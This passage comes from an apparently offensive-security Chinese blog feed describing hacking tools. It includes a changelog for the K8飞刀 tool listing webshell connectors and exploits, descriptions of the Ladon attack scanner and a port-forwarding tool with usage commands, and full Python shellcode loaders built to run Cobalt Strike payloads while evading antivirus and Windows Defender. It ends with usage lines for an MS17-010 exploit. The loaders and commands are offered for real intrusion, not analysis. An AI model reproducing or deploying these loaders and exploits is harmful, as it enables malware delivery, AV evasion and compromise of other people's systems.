\转/&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140811<br>=================================================================================<br>K8飞刀 20140810<br>[u]GUI&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 增加节日提醒 (公历节日、农历节日)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140810<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Perl Cmd WebShell&nbsp;&nbsp;&nbsp; (Perl一句话木马连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140807<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Python Cmd WebShell&nbsp; (Python一句话木马连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140806<br>[+]CmdShell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ColdFusion Cmd WebShell (CFM一句话木马连接)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805<br>[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 合并数据库(支持导入菜刀数据库) 进行管理&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805<br>[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 修复 WebShell 添加/修改提示对象已释放Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805<br>[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加 WebShell 判断是否已存在 不重复添加&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140805<br>=================================================================================<br>K8飞刀 20140731<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加Apache Struts2 S2-020 GetShell EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140731<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 空格转%20 空格转/**/(Struts2漏洞用到)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140731<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加已存在EXP 会提示EXP对应按扭名称&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140729<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 允许添加修改 EXP按钮名称较长字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140729<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 JS Escape默认加密与全部加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 FromCharCode专用ASCII码生成&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 JS转义 (16进制/Unicode)字符串&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; XSS常用 HTML实体编码(10进制/16进制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140728<br>=================================================================================<br>K8飞刀 20140725<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加18个Fckeditor 19个Joomla 0day漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 添加Discuz! 7.2 faq.php 注入 0day漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Tipask 2.0 ajaxsearch URL编码注入漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 字符串转Unicode Unicode转字符串 SHA1加密&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; SHA加密算法系列 (SHA256 SHA384 SHA512)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140725<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键增加导入合并其它数据库的EXP数据功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140721<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Base64 支持3种编码(GB2312 UTF8 Unicode)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140721<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; URL编码支持3种编码(GB2312 UTF8 Unicode)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140721<br>[+]ShellManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键删除增加是否删除提示,免得误删Shell&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140720<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 右键EXP按钮可删除和修改当前按钮对应EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140716<br>[+]ExploitManage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 动态创建按钮加载对应Payload,生成漏洞EXP&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140714<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 一键添加EXP到Web_Exploit模块数据库功能&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140711<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; None模式(只浏览网页不提交任何数据)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140711<br>=================================================================================<br>K8飞刀 20140707<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Cookie格式不对,提交闪退的Bug&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140707<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 任意文件 转换HEX编码(16进制)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 任意文件 转换CHR编码(ASC码)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDF提权 MYSQL HEX格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; UDF提权 MYSQL CHR格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MOF提权 MYSQL HEX格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]EncodeDecode&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; MOF提权 MYSQL CHR格式编码转换&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140703<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 伪造 HTTP Referer (请求来源)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140626<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; userAgent 自定义编辑&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140608<br>[+]Get/Post&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; userAgent修复(之前版本忘了加了)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 20140423<br>=================================================================================<br>[+]之前的 回忆过去,痛苦的相思忘不了.</p>]]></content>
      <categories>
        <category>工具</category>
      </categories>
      <tags>
        <tag>Exp</tag>
        <tag>Tool</tag>
      </tags>
  </entry>
  <entry>
    <title>Ladon Scanner For Python</title>
    <url>/p/dcb670e3.html</url>
    <content><![CDATA[<h1 id="Ladon-Scanner-For-Python"><a href="#Ladon-Scanner-For-Python" class="headerlink" title="Ladon Scanner For Python"></a>Ladon Scanner For Python</h1><p><img alt data-original="https://k8gege.github.io/k8img/Ladon/Dragon.jpg"></p>
<h3 id="PyLadon"><a href="#PyLadon" class="headerlink" title="PyLadon"></a>PyLadon</h3><p>目前python版功能较少,无论在Windows还是Linux系统性能以及速度均也比不上Ladon.exe<br><br>唯一的优点是跨平台,后续会添加相关功能，缺点也明显py打包程序很大，不太适合在目标使用<br><br><img data-original="https://k8gege.github.io/k8img/Ladon//py/PyLadon.PNG"></p>
<h3 id="程序简介"><a href="#程序简介" class="headerlink" title="程序简介"></a>程序简介</h3><p>Ladon一款用于大型网络渗透的多线程插件化综合扫描神器，含端口扫描、服务识别、网络资产、密码爆破、高危漏洞检测以及一键GetShell，支持批量A段/B段/C段以及跨网段扫描，支持URL、主机、域名列表扫描。5.5版本内置39个功能模块,通过多种协议以及方法快速获取目标网络存活主机IP、计算机名、工作组、共享资源、网卡地址、操作系统版本、网站、子域名、中间件、开放服务、路由器、数据库等信息，漏洞检测包含MS17010、Weblogic、ActiveMQ、Tomcat、Struts2等，密码爆破11种含数据库(Mysql、Oracle、MSSQL)、FTP、SSH(Linux主机)、VNC、Windows密码(IPC、WMI、SMB)、Weblogic后台、Rar压缩包密码等，Web指纹识别模块可识别75种（Web应用、中间件、脚本类型、页面类型）等，可高度自定义插件POC支持.NET程序集、DLL(C#/Delphi/VC)、PowerShell等语言编写的插件,支持通过配置INI批量调用任意外部程序或命令，EXP生成器可一键生成漏洞POC快速扩展扫描能力。Ladon支持Cobalt Strike插件化扫描快速拓展内网进行横向移动。<br></p>
<h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><table>
<thead>
<tr>
<th>ID</th>
<th>主题</th>
<th>URL</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>Ladon文档主页</td>
<td><a href="https://github.com/k8gege/Ladon/wiki" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki</a><br></td>
</tr>
<tr>
<td>2</td>
<td>基础用法详解</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Usage</a><br></td>
</tr>
<tr>
<td>3</td>
<td>Cobalt Strike</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-Cobalt-Strike" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-Cobalt-Strike</a><br></td>
</tr>
<tr>
<td>4</td>
<td>Exp生成器使用</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/LadonExp-Usage" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/LadonExp-Usage</a></td>
</tr>
<tr>
<td>5</td>
<td>高度自定义插件</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-Diy-Moudle</a></td>
</tr>
<tr>
<td>6</td>
<td>外部模块参考</td>
<td><a href="https://github.com/k8gege/K8CScan/wiki" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/wiki</a></td>
</tr>
<tr>
<td>7</td>
<td>PowerLadon</td>
<td><a href="https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-PowerShell" target="_blank" rel="noopener">https://github.com/k8gege/Ladon/wiki/Ladon-&amp;-PowerShell</a></td>
</tr>
<tr>
<td>8</td>
<td>PythonLadon</td>
<td><a href="https://github.com/k8gege/PyLadon" target="_blank" rel="noopener">https://github.com/k8gege/PyLadon</a></td>
</tr>
<tr>
<td>9</td>
<td>LinuxLadon</td>
<td><a href="https://github.com/k8gege/LinuxLadon" target="_blank" rel="noopener">https://github.com/k8gege/LinuxLadon</a></td>
</tr>
<tr>
<td>10</td>
<td>漏洞演示视频</td>
<td><a href="https://github.com/k8gege/K8CScan/tree/master/Video" target="_blank" rel="noopener">https://github.com/k8gege/K8CScan/tree/master/Video</a></td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>工具</category>
        <category>Ladon</category>
        <category>源码</category>
        <category>Python</category>
        <category>编程</category>
      </categories>
      <tags>
        <tag>Ladon</tag>
        <tag>Tool</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>.NET端口转发工具PortTran</title>
    <url>/p/3f55538f.html</url>
    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 简介</strong></span></p>
<p>PortTran by k8gege<br>.NET版端口转发工具，支持任意权限下转发 </p>
<p><span style="font-size: 18px;"><strong>0x002 背景</strong></span><br>工具在2016年左右写的，当时某个内网不知何原故LCX用不了</p>
<p>由于Win2003才刚停更不久，依然有不少内网还是03的机器</p>
<p>加上.NET版的兼容性均没LCX好，所以我自己也很少用...</p>
<p>以至于忘了自己有弄过这玩意，现在基本都WIN7以后系统</p>
<p>.net程序不用慌了，体积小和易于免杀大家都开心了。</p>
<p><span style="font-size: 18px;"><strong>0x003 用法</strong></span></p>
<div class="cnblogs_Highlighter">
<pre class="brush:python;gutter:true;">0x001 VPS监听
PortTranS.exe 8000 338

<p>0x002 目标内网转发<br>PortTranC20.exe 192.168.1.103 3389 192.168.1.102 8000</p>
<p>0x003 VPS连接3389<br>mstsc /console /v:127.0.0.1:338<br></p></pre><p></p>
</div>
<p><span style="font-size: 18px;"><strong>&nbsp;0x004 实例 </strong></span></p>
<p>1.vps监听</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran1.png"></p>
<p>2.目标内网3389端口转发</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran2.png"></p>
<p>3. 连接VPS的338端口即为被转发内网机器的3389，同理可转发其它端口，使用对应的工具连接就可以了</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/PortTran3.png"></p>
<p>不要死板，很多人误以为只能用于转发3389，这是因为不理解什么叫端口转发，如果只能转特定端口</p>
<p>就不会起名叫端口转发了，应该叫3389转发，1433、1521等端口不是端口吗？内网访问不了你都可以转出来</p>
<p>再使用对应数据库连接工具连接啊，要懂得举一反三，不要死脑筋，只懂用于转发3389。</p>
<p><span style="font-size: 18px; color: #ff00ff;"><strong>0x005 下载</strong></span></p>
<p><a href="https://github.com/k8gege/K8tools/raw/master/PortTran.rar" target="_blank">https://github.com/k8gege/PortTran</a></p>
<p>&nbsp;</p>]]></content>
      <categories>
        <category>工具</category>
        <category>.NET</category>
      </categories>
      <tags>
        <tag>Tool</tag>
        <tag>PortTran</tag>
      </tags>
  </entry>
  <entry>
    <title>Python免杀ShellCode加载器(Cobalt Strike/Metasploit)</title>
    <url>/p/f3512dbc.html</url>
    <content><![CDATA[<p><span style="font-size: 18px;"><strong>0x001 原理</strong></span></p>
<p>采用分离法，即将ShellCode和加载器分离。方法较LOW但免杀。</p>
<p>本文主要将ShellCode转成HEX，再通过加载器执行ShellCode。</p>
<p>PS: 何为SC加载器，即专门用于加载所提供ShellCode的工具。</p>
<p>如同HTTP发包工具，支持提交HTTP，写死参数最多只能叫EXP。</p>
<p>再详细点，打个比方，你只会炒一个菜，你敢说你是厨师吗？</p>
<p><span style="font-size: 18px;"><strong>0x002 ShellCode免杀</strong></span></p>
<p>CS可生成很多种格式的ShellCode，具体该用哪一种呢？</p>
<p>由于部分杀软会查杀ShellCode文件，所以不能直接使用RAW。</p>
<p>其实不用测都知道HEX字串肯定比RAW或标准C格式安全。</p>
<p>因为RAW和标准C格式一直以来都比较常用，被杀一点都不奇怪。</p>
<p>当然实际上使用任意格式都可以，前提是需要加解密。</p>
<p>下面我们拿CS3.13的ShellCode来做个对比，结果如下</p>
<p>CS生成Raw格式的ShellCode被7个杀软查杀(payload.bin)<br>http://r.virscan.org/language/zh-cn/report/a24430ec84bdb3dd3ee0b7a1aa501635<br>将CS的ShellCode转成Hex无一杀软查杀(hex.txt)<br>http://r.virscan.org/language/zh-cn/report/fe7412921c7acc9d69b0da72793cd57d</p>
<p><span style="font-size: 18px;"><strong>0x003 加载器</strong></span></p>
<p>以python为例，这个无脑的语言开发比较快。要使用其它加解密算法也非常简单</p>
<p>缺点就是文件有点大而已，不过问题不大，毕竟在免杀面前2M也是能接受的哈哈。</p>
<p>其它语言也同理啊，大家不要纠结用什么语言来写工具。用PY只是便于大家理解</p>
<p>ScRunHex.py</p>
<div class="cnblogs_Highlighter">
<pre class="brush:python;gutter:true;">#scrun by k8gege
import ctypes
import sys
#calc.exe
#sc = "DBC3D97424F4BEE85A27135F31C9B13331771783C704039F49C5E6A38680095B57F380BE6621F6CBDBF57C99D77ED00963F2FD3EC4B9DB71D50FE4DD1511981F4AF1A1D09FF0E60C6FA0BF5BC255CB19DF541B165F2F1EE81485213884926AA0AEFD4AD1631EB69808D54C1BD927AC2A25EB9383A8F5D42353802E50EE93F42B3411E98BBF81C92A13579920D813C524DFF07D5054F751D12EDC75BAF57D2F665B812FCE04273BFC5151666AA7D31CD3A7EB1E73C0DA951C97E27F5967A922CBE074B74E6D876D8C8804846C6F14ED692B921D03247722B045524157D63EA8F25EA4B4"
shellcode=bytearray(sys.argv[1].decode("hex"))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
</div>
<pre class="brush:python;gutter:true;"></pre>
<p>下面以前写的加载器，GUI的专门用于本地测试ShellCode是否正常用的，在测试漏洞的时候，</p>
<p>首先先保证你的ShellCode是可运行的吧，要不然漏洞没问题，马没上线，你说漏洞不行就乱来了。</p>
<p>除了PY和C#以外，VC、Delphi、VB的SC加载都有写过，Delphi版的在博客里就能找到例子。</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun1.png"></p>
<p><span style="font-size: 18px; color: #ff00ff;"><strong>&nbsp;0x004 实战CS上线<br></strong></span></p>
<p><span style="font-size: 18px; color: #ff00ff;"><strong>一、Hex ShellCode</strong></span></p>
<p>1.首先使用CS生成标准C格式的payload，格式（\xfc\xe8\x89\x00）在飞刀里我定义为Char格式</p>
<p>2.因为CS没有直接生成HEX格式的功能，所以需要使用K8飞刀将其转换成HEX格式。</p>
<p>具体步骤：选中Char格式的Shellcode，右键-Hacking--ShellCode--Char2Hex</p>
<p>其它溢出漏洞使用的ShellCode格式，均可使用飞刀进行转换或反转成标准格式</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun2.png"></p>
<p>3.使用scrun.exe加载Hex格式的ShellCode，发现我们的CS上线了。</p>
<p>如果我没记错此方式目前也还能过Win10系统自带的Defender</p>
<p>不知大家有没发现Hex字符串除了不被杀以外，还无需落地</p>
<p>而Bin文件需要落地且被Defender杀(这个我肯定没有记错)</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun3.png"></p>
<p><span style="color: #ff00ff;"><strong>二、Base64(Hex) ShellCode</strong></span></p>
<p>当然我们还可以对其进一步加密，先将Char转成Hex，再将HEX加密转成Base64，加密方法同上。</p>
<p><img alt data-original="http://k8gege.org/k8img/posts/pyscrun4.png"></p>
<p>ScRunBase64.py 执行Base64格式ShellCode代码如下</p>
<div class="cnblogs_Highlighter">
<pre class="brush:python;gutter:true;">#scrun by k8gege
import ctypes
import sys
import base64
#calc.exe
#REJDM0Q5NzQyNEY0QkVFODVBMjcxMzVGMzFDOUIxMzMzMTc3MTc4M0M3MDQwMzlGNDlDNUU2QTM4NjgwMDk1QjU3RjM4MEJFNjYyMUY2Q0JEQkY1N0M5OUQ3N0VEMDA5NjNGMkZEM0VDNEI5REI3MUQ1MEZFNEREMTUxMTk4MUY0QUYxQTFEMDlGRjBFNjBDNkZBMEJGNUJDMjU1Q0IxOURGNTQxQjE2NUYyRjFFRTgxNDg1MjEzODg0OTI2QUEwQUVGRDRBRDE2MzFFQjY5ODA4RDU0QzFCRDkyN0FDMkEyNUVCOTM4M0E4RjVENDIzNTM4MDJFNTBFRTkzRjQyQjM0MTFFOThCQkY4MUM5MkExMzU3OTkyMEQ4MTNDNTI0REZGMDdENTA1NEY3NTFEMTJFREM3NUJBRjU3RDJGNjY1QjgxMkZDRTA0MjczQkZDNTE1MTY2NkFBN0QzMUNEM0E3RUIxRTczQzBEQTk1MUM5N0UyN0Y1OTY3QTkyMkNCRTA3NEI3NEU2RDg3NkQ4Qzg4MDQ4NDZDNkYxNEVENjkyQjkyMUQwMzI0NzcyMkIwNDU1MjQxNTdENjNFQThGMjVFQTRCNA==
shellcode=bytearray(base64.b64decode(sys.argv[1]).decode("hex"))
ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

<p>buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</p>
<p>ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),<br>                                     buf,<br>                                     ctypes.c_int(len(shellcode)))</p>
<p>ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(ptr),<br>                                         ctypes.c_int(0),<br>                                         ctypes.c_int(0),<br>                                         ctypes.pointer(ctypes.c_int(0)))</p>
<p>ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))<br></p></pre><p></p>
</div>
<p>&nbsp;</p>
<p><span style="font-size: 18px;"><strong><span style="color: #ff00ff;">0x005 下载</span></strong></span></p>
<p>&nbsp;<a href="https://github.com/k8gege/scrun" target="_blank">https://github.com/k8gege/scrun</a></p>
<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.exe" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.exe</a></p>
<p>&nbsp;<a href="https://github.com/k8gege/K8tools/blob/master/scrun.py" target="_blank">https://github.com/k8gege/K8tools/blob/master/scrun.py</a></p>
<p>&nbsp;</p>
<p>PS:网上有些文章把aspx加载shellcode称为分离Payload，难道只有EXE才叫Payload?</p>
<p>那么SQL注入时的SQL语句为什么叫Payload?远程代码执行的代码为什么叫Payload?</p>
<p>溢出漏洞的ShellCode为什么叫Payload? ShellCode写死在加载器里的显然不叫分离。</p>
<p>此时的加载器已经不叫加载器了，正如HTTP发包工具，支持任意HTTP发包。</p>
<p>但是把参数写死的HTTP发包，为什么只是叫XX利用工具，而不是叫发包工具。</p>
<p>同理，ShellCode加载器专门用于加载各类ShellCode的才叫加载器。</p>
<p>其实以前也写过VC版的加载器，只是方法较LOW，需要多一个文件或传参执行不适合发马</p>
<p>发马又得想方设法将其捆绑成一个文件，捆绑可能还会被杀，VC被杀得比较历害。</p>
<p>ShellCode加密分离后，因为最终执行需解必，拼按时就被杀了，都还没得加载。</p>
<p>所以从未打算使用这种LOW方法免杀，一般是没能力做单文件免杀才需要分离。</p>
<p>而不是现在一些人认为所谓高级新的免杀方法，这种小儿科，在刚接触这行时就会了</p>
<p>看看07-12年那会，捆绑还多么流行，木马切割成多文件合并免杀的思路会没人想到？</p>
<p>现在是因为捆绑可能导致更容易被杀，没办法才被迫使用分离，毕竟能一文件谁愿多文件</p>
<p>当然单文件我也可以做，只是费点时间，懒得做而已。相关APT文章里就很多方法</p>
<p>基本都是白名单加载DLL，DLL释放各种加密文件，再解密执行，最终加载CS而已。</p>]]></content>
      <categories>
        <category>工具</category>
        <category>免杀</category>
        <category>Metasploit</category>
        <category>Cobalt Strike</category>
        <category>ShellCode</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Tool</tag>
        <tag>Cobalt Strike</tag>
        <tag>Metasploit</tag>
        <tag>BypassAV</tag>
      </tags>
  </entry>
  <entry>
    <title>SMB溢出工具加强版</title>
    <url>/p/68a8bf1b.html</url>
    <content><![CDATA[<p><strong>工具:</strong>k8加强版zzz</p>
<p><strong>编译:</strong>python</p>
<p><strong>漏洞:</strong>MS17-010</p>
<p><strong>用法:</strong></p>
<p>zzz_exploit.exe 192.11.22.82<br>zzz_exploit.exe 192.11.22.82 exe参数<br>zzz_exploit.exe 192.11.22.82 exe参数 管道名</p>
